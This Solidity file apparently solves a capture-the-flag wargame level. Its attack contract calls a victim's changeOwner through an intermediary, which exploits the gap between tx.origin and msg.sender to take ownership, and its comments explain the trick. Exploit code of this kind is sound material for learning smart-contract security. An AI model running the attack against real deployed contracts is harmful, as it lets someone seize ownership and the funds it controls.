// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// create an interface to know how the victim contracts looks
interface Telephone {
    function changeOwner(address _owner) external;
}

// call the change owner from a contract, in this way tx.origin != msg.sender
// msg.sender is this contract
// tx.origin is the EOA that called the function attack
contract TelephoneAttack {
    Telephone private _telephone;

    function setTelephone(Telephone addr) external {
        _telephone = addr;
    }

    function attack(address newOwner) external {
        _telephone.changeOwner(newOwner);
    }
}
